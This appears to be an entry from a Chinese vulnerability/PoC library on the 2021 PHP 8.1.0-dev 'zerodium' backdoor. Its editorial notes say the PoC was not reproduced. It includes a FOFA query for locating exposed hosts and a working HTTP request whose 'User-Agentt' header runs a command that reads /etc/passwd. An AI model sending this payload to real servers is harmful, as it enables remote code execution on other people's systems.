---
fofa: ""
source: "wy876 漏洞文库"
product: "PHP/2021恶意开发提交"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
fofa_unverified: "PHP/8.1.0-dev"
title: "PHP-8.1.0-devzerodium后门命令执行漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：只有PHP8.1.0-dev，需限定恶意提交构建"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-6fb567f979536e95cc26be02"
entity_id: "ve-6fb567f979536e95cc26be02"
schema_version: "1"
---

## 核对与使用边界

- 测绘字段处置：原 fofa 字段为残缺表达式、错误平台语法或当前解析器不支持的形式，原值完整保留到 fofa_unverified，不把它当作已校验查询或受影响资产证据。正文检索方法保留；具体问题见下列原审阅项。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：只有PHP8.1.0-dev，需限定恶意提交构建

代码与实验材料：单个文件读取HTTP请求，无环境、响应或修复

来源证据范围：wy876及语雀转载，缺官方来源

- **事实待核（1）**：版本指纹不是后门确认；依据：资产测绘PHP/8.1.0-dev可命中无后门构建；无验证响应。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# PHP-8.1.0-dev zerodium后门命令执行漏洞

# 一、漏洞简介
PHP 8.1.0-dev 版本在2021年3月28日被植入后门，但是后门很快被发现并清除。当服务器存在该后门时，攻击者可以通过发送`User-Agentt`头来执行任意代码。

# 二、影响版本
+ PHP/8.1.0-dev

# 三、资产测绘
+ fofa`"PHP/8.1.0-dev"`
+ 特征


# 四、漏洞复现
```plain
GET / HTTP/1.1
Host: xx.xx.xx.xx
User-Agentt: zerodiumsystem("cat /etc/passwd");
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/wr81rdntsr6nz25n>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
